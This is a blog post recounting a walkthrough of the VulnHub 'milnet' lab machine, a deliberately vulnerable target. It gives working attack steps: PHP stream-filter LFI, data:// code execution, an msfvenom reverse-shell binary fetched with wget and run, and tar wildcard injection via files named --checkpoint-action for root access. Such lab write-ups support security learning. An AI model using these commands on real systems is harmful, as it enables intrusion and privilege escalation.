---
layout: post
title: milnet..again
description: milnet revisited
tags: vulnhub hacking php tar wildcard
---
<h2>Hello Milnet, again</h2>
<br>
Obviously since my blog died a while ago, I lost my <a href="https://www.vulnhub.com/entry/milnet-1,148/" target="_blank">milnet</a> writeup. That kinda bugged me, not because that my writeup was so awesome (it was not) but because it used some interesting techniques I had not previously abused before. <br>

<h3>This is not a write up, but just a <a href="https://www.youtube.com/watch?v=_lK4cX5xGiQ" target="_blank">tribute</a></h3>


First of all, the issues importing it in Virtualbox seem to have been fixed, other than that I needed to tell it that it was a 64 bit VM. No more .ova file hacking at least.

<u>Here are my notes, no screenshots or pictures this time:</u>

Point browser at IP of milnet also using <a href="https://portswigger.net/burp/freedownload" target="_blank">Burp Suite Free</a>

Notice that browsing the site, it uses POST variables to visit various pages using the parameter route=[php file]

The parameter does not allow for LFI for anything other than php files it seems; and they are interpreted before display so little use. However; some trial and error showed that abusing <a href="https://ddxhunter.wordpress.com/2010/03/10/lfis-exploitation-techniques/" target="_blank">php stream filters</a> you can display the contents of the php files:
<pre class="brush: php">
route=php://filter/convert.base64-encode/resource=bomb
</pre>

Sadly, this is not directly useful; however if php://filter is abusable, chances are that <a href="http://insecurety.net/?p=742" target="_blank">data://</a> can also be abused. It was :)

<pre class="brush: php">
route=data://text/plain;base64,[base64 encoded php program code]
</pre>

Where program could for example would be something like:
<pre class="brush:php">
&lt;?php 
$cmd=exec(whoami"); 
echo $cmd;
?&gt;
</pre>

Nicely outputs the user "www-data".

Ok, so we have RCE but what is the easiest way to give us an interactive shell? Obviously meterpreter reverse shell, so using msfvenom we generate an ELF binary for reverse tcp:

<pre class="brush: php">
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=ip LPORT=port -f elf > shell.elf
</pre>

We then put this binary in our local webroot and fire up Apache webserver. We then encode the wget command to download shell.elf to /tmp on the milnet machine and execute it. Sure enough, our multi-handler drops us in an limited shell from the user www-data.

Looking around the filesystem, what imediately caught my eye was /backup in the root. The script itself consisted of only 2 lines to tar the /var/www/html directory. This was obviously suspicious since we as www-data user have read-write and execute rights there and the resulting compressed archive was owned by root.

[insert an hour of breaking my head over what to do with this]

Some google-fu made me end up at <a href="https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt">https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt</a> which explained how tar and wildcards can be abused resulting in command execution. This was a most obvious factor due to the retarded backup script being executed and owned by root.

Making it work was trivial:
<pre class="brush: php">
cd /var/www/html
echo "/tmp/shell.elf" > shell.sh
chmod +x shell.sh
echo "" > --checkpoint=1
echo "" > --checkpoint-action=exec=sh\ shell.sh
</pre>

Then I killed the current meterpreter session and waited. Not long after it dropped me in a root shell!<br>
<img src="/static/img/victory.gif"><br>

